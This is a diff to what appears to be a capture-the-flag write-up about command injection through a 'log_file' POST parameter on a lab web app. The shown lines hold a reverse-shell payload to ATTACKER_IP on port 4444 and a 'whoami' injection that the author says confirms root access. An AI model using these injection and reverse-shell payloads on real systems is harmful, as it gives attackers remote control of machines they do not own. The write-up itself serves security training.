@@ -320,7 +320,9 @@ Priority: u=0, i
 log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
 ```
 
-The 'log_file' in this POST request getting a file from the '/var/log/apache'. Let's combine our test command - 
+The 'log_file' in this POST request getting a file from the '/var/log/apache' i.e. directly from the target machine's folder.
+
+Let's add some other system commands - 
 
 ```
 log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'&analyze_log=
@@ -334,7 +336,7 @@ Let's check another command -
 log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;bash+-c+'whoami+>+/tmp/test.txt'&analyze_log=
 ```
 
-And, yes after sending the request i can verify the newly created file.
+And, yes after sending the request I can verify the newly created file.
 
 ![Root Access](/Assets/Images/sea-10.png)
 
